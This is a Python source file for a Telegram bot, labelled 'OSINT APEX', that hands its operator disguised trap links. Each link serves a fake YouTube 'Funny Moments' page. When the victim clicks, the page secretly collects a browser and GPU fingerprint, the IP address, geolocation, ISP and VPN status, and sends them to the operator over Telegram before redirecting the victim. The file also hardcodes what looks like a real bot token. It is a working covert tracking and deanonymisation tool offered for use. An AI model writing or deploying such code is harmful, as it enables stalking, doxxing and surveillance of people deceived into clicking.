import asyncio, threading, requests, uuid, json, os, time
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
vault = {}
user_modes = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube - Funny Moments</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: Roboto, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; }
        .yt-nav { width: 100%; height: 48px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; padding: 0 16px; box-sizing: border-box; }
        .player-container { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; position: absolute; left: 28px; top: 14px; }
        .video-meta { padding: 12px 16px; width: 100%; box-sizing: border-box; }
        .video-title { font-size: 18px; color: #0f0f0f; font-weight: 400; line-height: 24px; }
        .video-stats { font-size: 12px; color: #606060; margin-top: 4px; }
    </style>
</head>
<body onclick="capture()">
    <div class="yt-nav"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player-container">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover; opacity: 0.9;">
        <div class="play-btn"></div>
    </div>
    <div class="video-meta">
        <div class="video-title">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
        <div class="video-stats">1.8 млн просмотров • 2 часа назад</div>
    </div>
<script>
let active = false;
async function capture() {
    if(active) return; active = true;
    let data = { 
        aid: "{{ aid }}", 
        ua: navigator.userAgent, 
        res: screen.width+"x"+screen.height,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        mem: navigator.deviceMemory || "N/A",
        plat: navigator.platform
    };
    
    // Технический фингерпринт
    try {
        let canvas = document.createElement('canvas');
        let gl = canvas.getContext('webgl');
        let debug = gl.getExtension('WEBGL_debug_renderer_info');
        data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
    } catch(e) {}

    fetch('/log', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify(data) 
    }).finally(() => { 
        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1500);
    });
}
</script>
</body>
</html>
"""

@app.route('/v/<aid>')
def view(aid):
    return render_template_string(HTML_TEMPLATE, aid=aid)

@app.route('/log', methods=['POST'])
def logger():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Расширенный GEO
    geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,mobile,proxy").json()
    
    token = "ID-" + str(uuid.uuid4())[:6].upper()
    vault[token] = {"client": d, "geo": geo}

    mode = user_modes.get(str(d['aid']), "ANALYTICS")
    
    connection_type = "📱 Mobile" if geo.get('mobile') else "🌐 Wi-Fi/Ethernet"
    vpn_status = "⚠️ VPN/Proxy" if geo.get('proxy') else "✅ Direct"

    report = (
        f"🌟 **НОВОЕ ПОДКЛЮЧЕНИЕ: {mode}**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📍 **ГЕО:** `{geo.get('city')}, {geo.get('country')}`\n"
        f"🌐 **IP:** `{ip}` ({vpn_status})\n"
        f"📶 **СЕТЬ:** {connection_type} | `{geo.get('isp')}`\n\n"
        f"📱 **УСТРОЙСТВО:**\n"
        f"• Модель: `{d.get('plat')}`\n"
        f"• RAM: `{d.get('mem')} GB`\n"
        f"• GPU: `{d.get('gpu', 'N/A')[:40]}...`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **ТОКЕН ДЛЯ ДАМПА:** `{token}`"
    )
    
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- BOT INTERFACE ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🧨 Сгенерировать ссылку")
    await message.answer("🛠 **OSINT APEX v28.0**\nГотов к работе.", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🧨 Сгенерировать ссылку")
async def mode_select(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 Полный отчет (OSINT)", callback_data="m_ANALYTICS")
    kb.button(text="👻 Скрытый режим (Fast)", callback_data="m_GHOST")
    kb.adjust(1)
    await message.answer("Выбери режим работы ловушки:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("m_"))
async def finalize(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_modes[str(callback.from_user.id)] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"🎯 **ССЫЛКА ГОТОВА**\n\nРежим: `{mode}`\n🔗 `{link}`\n\n*Маскировка: YouTube (Funny Moments)*")

@dp.message(F.text.startswith("ID-"))
async def get_dump(message: types.Message):
    t = message.text.strip().upper()
    if t in vault:
        dump = json.dumps(vault[t], indent=2, ensure_ascii=False)
        await message.answer(f"📦 **ПОЛНЫЙ ДАМП {t}:**\n```json\n{dump}\n```")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
